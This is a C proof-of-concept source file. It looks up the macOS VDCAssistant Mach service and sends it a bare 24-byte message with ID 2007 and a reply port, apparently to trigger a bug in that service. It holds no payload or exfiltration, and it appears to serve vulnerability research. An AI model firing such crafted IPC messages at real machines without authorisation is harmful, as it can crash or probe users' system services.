// Minimal PoC for com.apple.cmio.VDCAssistant with Local Port
// Build: clang -o vdc_poc_with_local vdc_poc_with_local.c
// Run:   ./vdc_poc_with_local

#include <mach/mach.h>
#include <servers/bootstrap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    mach_msg_header_t header;
    // No body needed as size is 24 (sizeof(mach_msg_header_t))
} vdc_message_t;

int main(void) {
    kern_return_t kr;
    mach_port_t bootstrap_port;
    mach_port_t service_port;
    mach_port_t reply_port;
    vdc_message_t msg;

    // 1. Get bootstrap port
    kr = task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &bootstrap_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to get bootstrap port: %s\n", mach_error_string(kr));
        return 1;
    }

    // 2. Look up service
    kr = bootstrap_look_up(bootstrap_port, "com.apple.cmio.VDCAssistant", &service_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to look up service com.apple.cmio.VDCAssistant: %s\n", mach_error_string(kr));
        return 1;
    }
    printf("Got service port: 0x%x\n", service_port);

    // 3. Allocate Reply Port (Local Port)
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    if (kr != KERN_SUCCESS) {
        printf("Failed to allocate reply port: %s\n", mach_error_string(kr));
        return 1;
    }
    // Optional: insert a send right if we wanted to manipulate it further, 
    // but MAKE_SEND logic in msgh_bits handles creating the send right from our receive right for the receiver.
    printf("Allocated reply port: 0x%x\n", reply_port);

    // 4. Construct message
    memset(&msg, 0, sizeof(msg));

    // Update msgh_bits:
    // Remote: MACH_MSG_TYPE_COPY_SEND (19) - We hold a send right, we copy it to kernel/destination
    // Local:  MACH_MSG_TYPE_MAKE_SEND (20) - We hold a receive right, we make a send right for the destination
    // MACH_MSGH_BITS(remote, local)
    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND);
    
    msg.header.msgh_size = 24;
    msg.header.msgh_remote_port = service_port;
    msg.header.msgh_local_port = reply_port;
    msg.header.msgh_voucher_port = MACH_PORT_NULL;
    msg.header.msgh_id = 2007;

    // 5. Send message
    printf("Sending message with local port...\n");
    kr = mach_msg(
        &msg.header,
        MACH_SEND_MSG,
        msg.header.msgh_size,
        0,
        MACH_PORT_NULL,
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL
    );

    if (kr != KERN_SUCCESS) {
        printf("Failed to send message: %s (0x%x)\n", mach_error_string(kr), kr);
        return 1;
    }
    else{
        printf("Message sent successfully.\n");
    }
    
    // Optional: Wait for reply if the server sends one
    // But since this is just a PoC to trigger something, we might just exit or wait a bit.
    
    return 0;
}
